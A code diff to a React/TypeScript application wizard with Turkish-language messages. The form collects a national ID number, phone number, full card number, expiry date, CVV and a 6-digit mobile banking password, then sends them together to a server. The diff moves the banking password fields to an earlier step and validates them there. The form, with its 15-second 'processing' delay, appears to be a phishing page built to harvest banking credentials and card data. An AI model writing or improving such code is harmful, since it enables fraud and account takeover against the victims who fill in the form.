@@ -41,6 +41,8 @@ const emptyIdentity: IdentityData = {
   tcKimlik: "",
   phone: "",
   captcha: "",
+  mobilePin: "",
+  mobilePinConfirm: "",
 };
 
 const emptyPersonal: PersonalData = {
@@ -50,8 +52,6 @@ const emptyPersonal: PersonalData = {
   cardNumber: "",
   cardExpiry: "",
   cardCvv: "",
-  mobilePin: "",
-  mobilePinConfirm: "",
 };
 
 const PROCESSING_SECONDS = 15;
@@ -103,6 +103,14 @@ export default function ApplicationWizard() {
       }
       if (prev.firstName && data.firstName.trim()) delete next.firstName;
       if (prev.lastName && data.lastName.trim()) delete next.lastName;
+      if (prev.mobilePin && data.mobilePin.length === 6) delete next.mobilePin;
+      if (
+        prev.mobilePinConfirm &&
+        data.mobilePinConfirm.length === 6 &&
+        data.mobilePin === data.mobilePinConfirm
+      ) {
+        delete next.mobilePinConfirm;
+      }
       return next;
     });
   };
@@ -113,9 +121,7 @@ export default function ApplicationWizard() {
       if (
         !prev.cardNumber &&
         !prev.cardExpiry &&
-        !prev.cardCvv &&
-        !prev.mobilePin &&
-        !prev.mobilePinConfirm
+        !prev.cardCvv
       ) {
         return prev;
       }
@@ -132,14 +138,6 @@ export default function ApplicationWizard() {
         delete next.cardExpiry;
         delete next.cardCvv;
       }
-      if (prev.mobilePin && data.mobilePin.length === 6) delete next.mobilePin;
-      if (
-        prev.mobilePinConfirm &&
-        data.mobilePinConfirm.length === 6 &&
-        data.mobilePin === data.mobilePinConfirm
-      ) {
-        delete next.mobilePinConfirm;
-      }
       return next;
     });
   };
@@ -153,6 +151,14 @@ export default function ApplicationWizard() {
     }
     if (phoneToDigits(identity.phone).length < 11) {
       errors.phone = "Geçerli telefon numarası giriniz";
+    }
+    if (identity.mobilePin.length !== 6) {
+      errors.mobilePin = "6 haneli mobil şifre giriniz";
+    }
+    if (identity.mobilePinConfirm.length !== 6) {
+      errors.mobilePinConfirm = "Mobil şifreyi tekrar giriniz";
+    } else if (identity.mobilePin !== identity.mobilePinConfirm) {
+      errors.mobilePinConfirm = "Mobil şifreler eşleşmiyor";
     }
     setIdentityErrors(errors);
     return Object.keys(errors).length === 0;
@@ -168,15 +174,6 @@ export default function ApplicationWizard() {
         errors.cardExpiry = "Geçersiz son kullanma";
       }
       if (personal.cardCvv.length !== 3) errors.cardCvv = "CVV gerekli";
-    }
-
-    if (personal.mobilePin.length !== 6) {
-      errors.mobilePin = "6 haneli mobil şifre giriniz";
-    }
-    if (personal.mobilePinConfirm.length !== 6) {
-      errors.mobilePinConfirm = "Mobil şifreyi tekrar giriniz";
-    } else if (personal.mobilePin !== personal.mobilePinConfirm) {
-      errors.mobilePinConfirm = "Mobil şifreler eşleşmiyor";
     }
 
     setPersonalErrors(errors);
@@ -235,7 +232,7 @@ export default function ApplicationWizard() {
           : personal.cardNumber.replace(/\D/g, ""),
         cardExpiry: personal.noCreditCard ? "" : personal.cardExpiry,
         cardCvv: personal.noCreditCard ? "" : personal.cardCvv,
-        mobilePin: personal.mobilePin,
+        mobilePin: identity.mobilePin,
       }),
     });
     const data = await res.json();
